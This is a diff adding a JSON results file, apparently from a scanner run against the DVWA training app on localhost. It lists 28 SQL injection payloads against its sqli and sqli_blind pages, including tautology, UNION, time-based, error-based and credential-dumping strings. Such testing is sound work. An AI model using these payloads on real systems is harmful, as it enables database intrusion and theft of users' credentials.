@@ -1,0 +1,200 @@
+{
+    "vulnerabilities": [
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "1'",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' OR 1=1 --",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' OR '1'='1",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "1' OR '1'='1",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "1' OR 1=1--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "admin'--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' UNION SELECT NULL--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' UNION SELECT NULL,NULL--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' OR 'a'='a",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "') OR ('1'='1",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' OR \"1\"=\"1",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' OR 1=1#",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' UNION SELECT 1,2,3--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' ORDER BY 1--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' ORDER BY 2--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' ORDER BY 3--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' GROUP BY CONCAT(username,0x3a,password) FROM users--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' AND SLEEP(3)--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' OR IF(1=1,SLEEP(3),0)--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' AND 1=CONVERT(int,@@version)--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' OR updatexml(1,concat(0x7e,user(),0x7e),1)--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' OR (SELECT 1 FROM dual)--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli/",
+            "method": "GET",
+            "payload": "' AND 1=(SELECT 1)--",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli_blind/",
+            "method": "GET",
+            "payload": "' OR '1'='1",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli_blind/",
+            "method": "GET",
+            "payload": "1' OR '1'='1",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli_blind/",
+            "method": "GET",
+            "payload": "' OR 'a'='a",
+            "type": "SQL Injection",
+            "severity": "High"
+        },
+        {
+            "url": "http://localhost/dvwa/vulnerabilities/sqli_blind/",
+            "method": "GET",
+            "payload": "' OR 1=1#",
+            "type": "SQL Injection",
+            "severity": "High"
+        }
+    ]
+}
